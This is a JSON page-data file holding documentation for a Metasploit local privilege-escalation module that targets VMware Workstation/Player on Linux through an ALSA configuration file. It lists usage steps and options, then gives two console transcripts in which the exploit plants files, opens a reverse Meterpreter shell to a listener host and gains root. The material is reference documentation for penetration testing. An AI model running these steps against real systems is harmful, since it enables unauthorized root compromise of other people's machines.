{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/vmware_alsa_config","result":{"data":{"moduleMetadataJson":{"id":"c45f4ccd-50ad-5124-ae2f-451b7d905ba3","name":"VMware Workstation ALSA Config File Local Privilege Escalation","fullname":"exploit/linux/local/vmware_alsa_config","description":"This module exploits a vulnerability in VMware Workstation Pro and\n        Player on Linux which allows users to escalate their privileges by\n        using an ALSA configuration file to load and execute a shared object\n        as root when launching a virtual machine with an attached sound card.\n\n        This module has been tested successfully on VMware Player version\n        12.5.0 on Debian Linux 8 Jessie.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/vmware_alsa_config","documentationSlug":"/modules/documentation/exploit/linux/local/vmware_alsa_config","referencesSlug":"/modules/references/exploit/linux/local/vmware_alsa_config"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a vulnerability in VMware Workstation Pro and\nPlayer on Linux which allows users to escalate their privileges by\nusing an ALSA configuration file to load and execute a shared object\nas <code class=\"language-text\">root</code> when launching a virtual machine with an attached sound card.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  VMware Workstation Pro and VMware Workstation Player are the industry\nstandard for running multiple operating systems as virtual machines on\na single PC. Thousands of IT professionals, developers and businesses\nuse Workstation Pro and Workstation Player to be more agile, more\nproductive and more secure every day.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>VMware Player version 12.5.0 on Debian Linux 8 Jessie</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/vmware_alsa_config</code></li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new <code class=\"language-text\">root</code> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<p>  <strong>Xdisplay</strong></p>\n<p>  Display exploit will attempt to use (default: <code class=\"language-text\">:0</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"command-shell-session---vmware-player-1250-debian-8-jessie\" style=\"position:relative;\"><a href=\"#command-shell-session---vmware-player-1250-debian-8-jessie\" aria-label=\"command shell session   vmware player 1250 debian 8 jessie permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Command Shell Session - VMware Player 12.5.0 (Debian 8 Jessie)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/vmware_alsa_config \nmsf5 exploit(linux/local/vmware_alsa_config) &gt; set lhost 172.16.191.188\nlhost =&gt; 172.16.191.188\nmsf5 exploit(linux/local/vmware_alsa_config) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/vmware_alsa_config) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.188:4444 \n[*] Writing &#39;/tmp/pSvQHD5S5fh/afLaYVIoUm.so.c&#39; (526 bytes) ...\n[*] Writing &#39;/tmp/pSvQHD5S5fh/pSvQHD5S5fh.vmx&#39; (560 bytes) ...\n[*] Writing &#39;/tmp/pSvQHD5S5fh/jl7XmpZWdE&#39; (964720 bytes) ...\n[*] Writing &#39;/home/user/.asoundrc&#39; (116 bytes) ...\n[*] Launching VMware Player...\n[*] Meterpreter session 2 opened (172.16.191.188:4444 -&gt; 172.16.191.208:57796) at 2018-12-17 02:43:22 -0500\n[+] Deleted /home/user/.asoundrc\n[+] Deleted /home/user/Desktop/~/.vmware/preferences\n[!] Attempting to delete working directory /tmp/pSvQHD5S5fh\n[-] Exploit failed: negative array size (or size too big)\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.208\nOS           : Debian 8.8 (Linux 3.16.0-4-amd64)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"meterpreter-session---vmware-player-1250-debian-8-jessie\" style=\"position:relative;\"><a href=\"#meterpreter-session---vmware-player-1250-debian-8-jessie\" aria-label=\"meterpreter session   vmware player 1250 debian 8 jessie permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Meterpreter Session - VMware Player 12.5.0 (Debian 8 Jessie)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/vmware_alsa_config \nmsf5 exploit(linux/local/vmware_alsa_config) &gt; set lhost 172.16.191.188\nlhost =&gt; 172.16.191.188\nmsf5 exploit(linux/local/vmware_alsa_config) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/vmware_alsa_config) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.188:4444 \n[*] Writing &#39;/tmp/5irkXF31Iw/GHAPsWBkjix.so.c&#39; (527 bytes) ...\n[*] Writing &#39;/tmp/5irkXF31Iw/5irkXF31Iw.vmx&#39; (558 bytes) ...\n[*] Writing &#39;/tmp/5irkXF31Iw/Rxqj9taEcXol&#39; (964720 bytes) ...\n[*] Writing &#39;/home/user/.asoundrc&#39; (116 bytes) ...\n[*] Launching VMware Player...\n[*] Meterpreter session 2 opened (172.16.191.188:4444 -&gt; 172.16.191.208:57799) at 2018-12-17 02:46:39 -0500\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.208\nOS           : Debian 8.8 (Linux 3.16.0-4-amd64)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c45f4ccd-50ad-5124-ae2f-451b7d905ba3"}}}